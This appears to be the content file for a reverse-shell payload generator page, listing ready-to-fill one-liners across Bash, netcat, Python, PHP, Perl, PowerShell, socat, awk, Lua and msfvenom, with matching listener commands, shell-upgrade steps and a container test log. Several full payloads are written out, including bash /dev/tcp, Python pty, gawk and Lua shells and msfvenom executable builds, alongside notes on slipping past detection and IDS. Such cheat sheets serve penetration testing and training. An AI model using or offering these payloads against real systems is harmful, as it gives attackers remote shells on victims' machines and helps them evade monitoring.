note: Payloads are the standard published forms, written out here rather than copied from any one site. Nothing on this page runs: the browser does string substitution and hands you text.

encodings.name: URL encode
encodings.help: For a payload going into a query string or form field.

encodings.name: Double URL encode
encodings.help: For a payload that passes through two decoders — a proxy and then the app.

encodings.name: Base64 (sh)
encodings.help: Wrapped so the target decodes and runs it. Survives quote and space mangling.

groups.name: Bash
groups.intro: Bash can open a TCP socket on its own through /dev/tcp, so these need nothing installed. The catch is that /dev/tcp is a bash and ksh feature, not a POSIX one — on a box where /bin/sh is dash they fail silently.

payloads.name: Bash -i
payloads.note: The one everybody reaches for first. Interactive shell, both streams redirected onto the socket.

payloads.name: Bash 196
payloads.note: Uses an explicit high file descriptor instead of >&. Works in places where the first one is filtered.

payloads.name: Bash read line
payloads.text: exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
payloads.note: No interactive shell at all: it reads a line, runs it, writes the output back. Survives environments that kill -i.

payloads.name: Bash UDP
payloads.note: Same trick over UDP. Pair it with a UDP listener (nc -u -lvnp).
payloads.warn: UDP has no connection, so you get no confirmation it worked.

payloads.name: Bash 5
payloads.note: Opens fd 5 read-write and points all three standard streams at it.

groups.name: Netcat
groups.intro: Netcat comes in incompatible flavours. The -e flag is a compile-time option that most distributions now ship disabled, which is why the mkfifo version exists.

payloads.name: nc -e
payloads.note: Only works on builds compiled with GAPING_SECURITY_HOLE. Try it first; fall back to mkfifo.

payloads.name: nc mkfifo
payloads.note: The portable one. A named pipe loops the shell's output back into netcat's input, which is what -e would have done.

payloads.name: nc -c
payloads.note: The BSD and OpenBSD spelling of -e.

payloads.name: BusyBox nc
payloads.note: BusyBox is on nearly every embedded box and most minimal containers, and its nc keeps -e.

payloads.name: ncat -e
payloads.note: Nmap's rewrite of netcat. Always has -e, and is often present wherever nmap is.

payloads.name: nc.exe -e
payloads.note: You have to get nc.exe onto the host first. Flagged by every AV in existence.
payloads.untestedWhy: Windows; no Windows host to run it on

groups.name: Python
groups.intro: Present on nearly every Linux host. The pty version gives you a real terminal immediately, which saves the upgrade dance later.

payloads.name: Python 3 (pty)
payloads.note: The best Linux payload on this page. pty.spawn gives you job control and a working Ctrl-C with no upgrade needed.

payloads.name: Python 3 (subprocess)
payloads.note: No pty, so no tab completion, but it avoids the pty module on stripped-down builds.

payloads.name: Python 3 (env vars)
payloads.text: export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'
payloads.note: Keeps the address out of the python string. Useful when quoting is being mangled by whatever is injecting it.

payloads.name: Python (Windows)
payloads.text: python.exe -c 'import socket,subprocess,os,threading;s=socket.socket();s.connect(("{ip}",{port}));p=subprocess.Popen(["cmd.exe"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for _ in iter(int,1)],daemon=True).start();[p.stdin.write(s.recv(1024)) or p.stdin.flush() for _ in iter(int,1)]'
payloads.note: No dup2 on Windows sockets, so it pumps bytes between the socket and cmd.exe by hand.
payloads.untestedWhy: Windows; no Windows host to run it on

groups.name: PHP
groups.intro: Six spellings of the same idea, because which exec-family function is disabled varies by host. If one returns nothing, try the next.

payloads.name: PHP exec
payloads.note: fsockopen lands on file descriptor 3, which is why every one of these redirects from <&3.

payloads.name: PHP proc_open
payloads.note: The one to try when the whole exec family is in disable_functions. proc_open is often missed.

groups.name: Perl
groups.intro: Still installed by default on most server distributions, and rarely monitored.

payloads.name: Perl without sh
payloads.note: Never spawns a shell binary, so it slips past controls that watch for sh or bash being executed.

payloads.name: Perl (Windows)
payloads.note: Same, minus the fork, which Windows Perl does not do well.
payloads.untestedWhy: Windows; no Windows host to run it on

groups.name: PowerShell
groups.intro: The Windows default. Note that -nop and -w hidden do nothing against AMSI or Defender on a modern host; assume these get caught unless you have already dealt with that.

payloads.name: PowerShell TCP
payloads.note: The standard one-liner. Reads from the socket, runs it through iex, writes the output back with a prompt.
payloads.untestedWhy: Windows; no Windows host to run it on

payloads.name: PowerShell download cradle
payloads.note: Pulls the real payload from your host instead of putting it on the command line. Keeps the long script out of logs.
payloads.warn: You have to be serving shell.ps1 — python3 -m http.server 80 on your box.
payloads.untestedWhy: Windows; no Windows host to run it on

payloads.name: PowerShell encoded
payloads.note: The TCP payload above, UTF-16LE then base64, which is what -e expects. Survives quote mangling.
payloads.warn: Picked up by anything watching for -e or -EncodedCommand.
payloads.untestedWhy: Windows; no Windows host to run it on

groups.name: socat
groups.intro: The only payload here that gives you a fully interactive TTY on the first connection, with no upgrade step.

payloads.name: socat TTY
payloads.note: Full TTY: arrow keys, tab completion, Ctrl-C that kills the remote process rather than your listener. Needs the socat listener, not nc.

payloads.name: socat (static binary)
payloads.note: When socat is not installed. Push a static build from your box first.
payloads.untestedWhy: needs an HTTP server on your own box; the test container has no network

groups.name: Other languages
groups.intro: When the usual suspects are missing, one of these usually is not.

payloads.name: Golang
payloads.note: Writes and compiles on the box, so it needs the Go toolchain present and a writable /tmp.
payloads.untestedWhy: no Go toolchain in the test image

payloads.name: awk
payloads.text: awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
payloads.note: Needs gawk specifically — mawk and busybox awk have no /inet support.

payloads.name: Lua
payloads.text: lua -e "local s=require('socket').tcp();s:connect('{ip}',{port});while true do local c,e=s:receive();if not c then break end;local f=io.popen(c..' 2>&1','r');s:send(f:read('*a'));f:close() end;s:close()"
payloads.note: Turns up on embedded devices and inside nginx/OpenResty and Redis. A command loop rather than a shell, because Lua gives no guarantee about which file descriptor the socket lands on.
payloads.warn: Needs the luasocket library. Without it, require('socket') fails immediately.

payloads.name: Telnet
payloads.note: Same named-pipe trick as nc mkfifo, for a box that has telnet but no netcat.

payloads.name: zsh
payloads.note: zsh has its own TCP module, so like bash it needs nothing installed.

payloads.name: OpenSSL (encrypted)
payloads.note: The only payload here that is not plaintext on the wire. Needs the OpenSSL listener and a certificate — the listener tab has both commands.

groups.name: msfvenom
groups.intro: For when you want a file rather than a one-liner, or a Meterpreter session rather than a shell. Catch these with the multi/handler listener, not nc.

payloads.name: Linux ELF
payloads.text: msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf
payloads.untestedWhy: generates a file; needs Metasploit, which is not installed here

payloads.name: Windows EXE
payloads.text: msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe
payloads.untestedWhy: generates a file; needs Metasploit, and a Windows host to run it on

payloads.name: Windows Meterpreter
payloads.text: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o met.exe
payloads.note: Meterpreter, not a plain shell. Needs exploit/multi/handler with the matching payload set.
payloads.untestedWhy: generates a file; needs Metasploit, and a Windows host to run it on

payloads.name: PHP
payloads.text: msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php
payloads.note: Prepend <?php and append ?> — msfvenom does not.
payloads.untestedWhy: generates a file; needs Metasploit, which is not installed here

payloads.name: JSP / WAR
payloads.text: msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war
payloads.note: For Tomcat manager uploads.
payloads.untestedWhy: generates a file; needs Metasploit and a Tomcat target

payloads.name: ASPX
payloads.text: msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx
payloads.untestedWhy: generates a file; needs Metasploit, and a Windows host to run it on

payloads.name: Python
payloads.untestedWhy: generates a file; needs Metasploit, which is not installed here

listeners.name: netcat
listeners.note: The default. -l listen, -v tell me what happened, -n no DNS lookups, -p port.

listeners.name: ncat
listeners.note: Nmap's netcat. Same flags, better behaved on disconnect.

listeners.name: ncat with TLS
listeners.note: Pairs with an ncat --ssl payload. Encrypts the session so an IDS sees TLS, not a shell.

listeners.name: rlwrap + nc
listeners.note: Wraps netcat in readline, so you get arrow keys and history in a raw shell without upgrading it.

listeners.name: pwncat-cs
listeners.note: Upgrades the shell to a full TTY by itself, and gives you file upload and download over the same session.

listeners.name: rustcat
listeners.note: Automatic TTY upgrade and command history, single static binary.

listeners.name: socat TTY listener
listeners.note: The listener side of the socat TTY payload. Must be this, not nc, or the pty negotiation does nothing.

listeners.name: OpenSSL listener
listeners.text: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost' && openssl s_server -quiet -key key.pem -cert cert.pem -port {port}
listeners.note: Generates a self-signed certificate, then listens with it. The payload side is the OpenSSL entry under Other languages.

listeners.name: Metasploit handler
listeners.text: msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; set ExitOnSession false; exploit -j"
listeners.note: Required for any msfvenom payload. The payload string here must match the one you generated.
listeners.untestedWhy: needs Metasploit, which is not installed here

listeners.name: UDP listener
listeners.note: For the Bash UDP and ncat UDP payloads.

upgrade.name: 1. Spawn a PTY
upgrade.why: A raw shell has no controlling terminal, so sudo, ssh, su and most text editors refuse to run. Any one of these gives you one. Try them in order; script is there for boxes with no Python.

upgrade.name: 2. Background and fix the local terminal
cmds: # press Ctrl-Z to background the shell, then on YOUR machine:
upgrade.why: stty raw -echo stops your own terminal from intercepting Ctrl-C and echoing what you type, and hands both through to the remote shell instead. fg brings the session back.

upgrade.name: 3. Set the terminal type and size
cmds: # read the numbers from `stty size` in YOUR terminal, then:
upgrade.why: Without TERM, clear, less, vim and nano all fail. Without the right size, anything full-screen draws over itself.

upgrade.name: Alternative: skip all of it
upgrade.why: The socat TTY payload negotiates a pty on connection, so you land in a full terminal with nothing to fix. Use it whenever socat is on the target.

verification.how: Each payload was read out of the live page's DOM, not retyped, then run inside a Debian container against a real listener on loopback. A pass means the listener got a shell that ran id and echoed a marker back. The container had no network at all, so nothing could reach anything outside it.
fixed: Lua connected and then handed the shell nothing: it assumed the socket lands on file descriptor 3, which is true of PHP's fsockopen and not of Lua. Replaced with a command loop that drives the socket directly, and tested.

ncat UDP was removed. ncat's exec family does not deliver a shell over UDP as a client in any spelling tried (-e, -c, --exec, --sh-exec): the listener never receives a byte. Bash UDP works and is tested, because its -i prompt primes the datagram the listener needs.
